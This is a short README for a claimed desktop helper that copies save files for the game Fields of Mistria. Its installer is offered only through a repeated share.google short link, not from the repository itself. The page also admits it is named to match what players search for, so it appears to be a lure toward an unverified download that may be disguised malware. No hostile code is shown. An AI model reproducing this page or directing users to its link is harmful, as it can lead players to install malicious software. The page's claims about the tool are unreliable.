![Fields of Mistria Desktop](assets/hero.png)

# Fields of Mistria Desktop

*Keep the farm on disk before the next content drop.*

## About

**Fields of Mistria Desktop** is a desktop helper. A local helper for Fields of Mistria farm folders, magic notes, and season photos.

Farm-and-magic saves hide under Steam IDs.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Finds the Mistria save folder.
- Copies farm and magic files.
- Lists season photo albums.
- Writes a short keep report.

## Background

Players look for Fields of Mistria on PC.

A named helper matches the title they type.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/janetc9657/fields-of-mistria-desktop

MIT license. See `LICENSE`.
